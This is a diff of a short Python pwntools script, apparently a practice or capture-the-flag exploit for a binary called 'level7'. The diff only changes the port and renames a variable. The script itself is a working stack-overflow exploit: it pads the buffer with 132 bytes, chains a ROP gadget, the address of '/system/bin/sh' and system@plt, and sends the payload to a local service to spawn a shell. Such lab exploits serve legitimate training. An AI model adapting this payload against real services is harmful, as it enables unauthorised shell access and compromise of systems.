@@ -2,7 +2,7 @@
 from pwn import *
  
 #p = process('./level7')
-p = remote('127.0.0.1',10001)
+p = remote('127.0.0.1',10002)
 
 p.recvuntil('\n')
 
@@ -10,12 +10,12 @@ p.recvuntil('\n')
 gadget1 = 0x0000894a + 1
 
 #"/system/bin/sh"
-r0 = 0x000096C0
+binshaddr = 0x000096C0
 
 #.plt:00008404 ; int system(const char *command)
 systemaddr = 0x00008404 
 
-payload =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(r0) + "\x00"*0x4 + p32(systemaddr)
+payload =  '\x00'*132 + p32(gadget1) + "\x00"*0xc + p32(binshaddr) + "\x00"*0x4 + p32(systemaddr)
 
 p.send(payload)
  
